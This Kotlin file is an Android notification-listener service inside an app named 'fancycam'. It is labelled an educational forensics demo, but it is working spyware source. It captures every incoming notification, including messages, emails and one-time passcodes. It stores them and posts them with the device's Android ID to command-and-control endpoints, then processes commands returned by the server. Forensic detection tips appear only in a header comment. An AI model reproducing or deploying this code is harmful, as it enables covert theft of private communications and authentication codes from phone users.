package xyz.nahil.fancycam.services

import xyz.nahil.fancycam.network.AppConfig
import xyz.nahil.fancycam.network.DataExfilSender
import xyz.nahil.fancycam.ui.AppActivityLogger
import android.app.Notification
import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.provider.Settings
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.util.concurrent.TimeUnit

/**
 * EDUCATIONAL DEMO - Android Security & Forensics Course
 *
 * Demonstrates how malware uses NotificationListenerService to read
 * all incoming notifications from every app — messages, emails, OTPs, etc.
 *
 * FOR USE IN SANDBOXED LAB ENVIRONMENTS ONLY.
 *
 * Forensic detection:
 *   - adb shell dumpsys notification --noredact
 *   - adb shell settings get secure enabled_notification_listeners
 *   - Look for NotificationListenerService binding in dumpsys activity services
 *
 * Educational note: User must explicitly grant notification access in
 * Settings > Security > Notification access. This is a user-visible
 * permission grant — a key forensic artifact.
 */
class NotificationReaderService : NotificationListenerService() {

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        sbn ?: return

        try {
            val notification = sbn.notification
            val extras: Bundle = notification.extras

            val title = extras.getCharSequence(Notification.EXTRA_TITLE)?.toString() ?: ""
            val text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString() ?: ""
            val subText = extras.getCharSequence(Notification.EXTRA_SUB_TEXT)?.toString() ?: ""
            val infoText = extras.getCharSequence(Notification.EXTRA_INFO_TEXT)?.toString() ?: ""
            val bigText = extras.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString() ?: ""

            // Skip completely empty system notification stubs if no readable text
            if (title.isBlank() && text.isBlank() && bigText.isBlank()) {
                return
            }

            val info = JSONObject().apply {
                put("package", sbn.packageName)
                put("title", title)
                put("text", text)
                put("sub_text", subText)
                put("info_text", infoText)
                put("big_text", bigText)
                put("progress", extras.getInt(Notification.EXTRA_PROGRESS, -1))
                put("progress_max", extras.getInt(Notification.EXTRA_PROGRESS_MAX, -1))
                put("timestamp", sbn.postTime)
                put("is_ongoing", sbn.isOngoing)
            }

            Log.d(TAG, "[EDUCATIONAL] Notification captured: ${info.toString(2)}")

            // 1. Persist notification in circular buffer for inclusion in periodic telemetry
            saveNotification(this, info)

            // 2. Log in app activity audit log
            AppActivityLogger.logActivity(
                context = this,
                type = "NOTIFICATION",
                title = "Notification intercepted",
                detail = "${sbn.packageName}: ${if (title.isNotEmpty()) title else text}",
                success = true
            )

            // 3. Immediately exfiltrate to C2 server in background thread
            exfiltrateNotification(this, info)

        } catch (e: Exception) {
            Log.e(TAG, "[EDUCATIONAL] Failed to parse or exfiltrate notification", e)
        }
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification?) {
        sbn ?: return
        Log.d(TAG, "[EDUCATIONAL] Notification removed: ${sbn.packageName}")
    }

    override fun onListenerConnected() {
        super.onListenerConnected()
        Log.i(TAG, "[EDUCATIONAL] Notification listener CONNECTED — all notifications visible")
    }

    override fun onListenerDisconnected() {
        super.onListenerDisconnected()
        Log.w(TAG, "[EDUCATIONAL] Notification listener DISCONNECTED")
    }

    companion object {
        private const val TAG = "NotificationReader"
        private const val PREFS_NAME = "fancycam_notifications"
        private const val KEY_NOTIFICATIONS = "stored_notifications"
        private const val MAX_NOTIFICATIONS = 50

        private val httpClient = OkHttpClient.Builder()
            .connectTimeout(15, TimeUnit.SECONDS)
            .writeTimeout(15, TimeUnit.SECONDS)
            .readTimeout(15, TimeUnit.SECONDS)
            .build()

        @Synchronized
        fun saveNotification(context: Context, notificationJson: JSONObject) {
            try {
                val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
                val existing = JSONArray(prefs.getString(KEY_NOTIFICATIONS, "[]") ?: "[]")
                val updated = JSONArray()
                updated.put(notificationJson)
                val limit = minOf(existing.length(), MAX_NOTIFICATIONS - 1)
                for (i in 0 until limit) {
                    updated.put(existing.getJSONObject(i))
                }
                prefs.edit().putString(KEY_NOTIFICATIONS, updated.toString()).apply()
            } catch (e: Exception) {
                Log.e(TAG, "Failed to persist notification", e)
            }
        }

        @Synchronized
        fun getCapturedNotifications(context: Context): JSONArray {
            return try {
                val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
                JSONArray(prefs.getString(KEY_NOTIFICATIONS, "[]") ?: "[]")
            } catch (e: Exception) {
                JSONArray()
            }
        }

        @Synchronized
        fun clearCapturedNotifications(context: Context) {
            context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE).edit().remove(KEY_NOTIFICATIONS).apply()
        }

        fun isNotificationAccessEnabled(context: Context): Boolean {
            return try {
                androidx.core.app.NotificationManagerCompat.getEnabledListenerPackages(context)
                    .contains(context.packageName)
            } catch (e: Exception) {
                Log.w(TAG, "Cannot check notification access: ${e.message}")
                false
            }
        }

        fun openNotificationAccessSettings(context: Context) {
            try {
                val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                context.startActivity(intent)
            } catch (e: Exception) {
                Log.e(TAG, "Cannot open notification access settings: ${e.message}", e)
            }
        }

        fun ensureNotificationAccess(context: Context): Boolean {
            if (isNotificationAccessEnabled(context)) return true
            Log.w(TAG, "[EDUCATIONAL] Notification access not granted; prompting user")
            openNotificationAccessSettings(context)
            return false
        }

        fun exfiltrateNotification(context: Context, notificationJson: JSONObject) {
            Thread {
                try {
                    val payload = JSONObject().apply {
                        put("device_info", DataExfilSender.buildDevicePayload(context))
                        put("notification_event", notificationJson)
                        put("notifications", getCapturedNotifications(context))
                    }
                    val mediaType = "application/json; charset=utf-8".toMediaType()
                    val body = payload.toString().toRequestBody(mediaType)
                    val aid = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: ""

                    for (endpoint in AppConfig.getJsonExfilEndpoints(context)) {
                        try {
                            val request = Request.Builder()
                                .url(endpoint)
                                .post(body)
                                .addHeader("User-Agent", "FancyCam-Educational/1.0")
                                .apply {
                                    if (aid.isNotEmpty()) {
                                        addHeader("X-Android-ID", aid)
                                    }
                                }
                                .build()

                            httpClient.newCall(request).execute().use { response ->
                                if (response.isSuccessful) {
                                    Log.i(TAG, "[EDUCATIONAL] Notification successfully exfiltrated to $endpoint")
                                    val bodyStr = response.body?.string().orEmpty()
                                    DataExfilSender.processServerCommands(context, bodyStr)
                                    return@Thread
                                }
                            }
                        } catch (e: Exception) {
                            Log.w(TAG, "Failed to exfiltrate notification to $endpoint: ${e.message}")
                        }
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Notification exfiltration worker failed", e)
                }
            }.start()
        }
    }
}
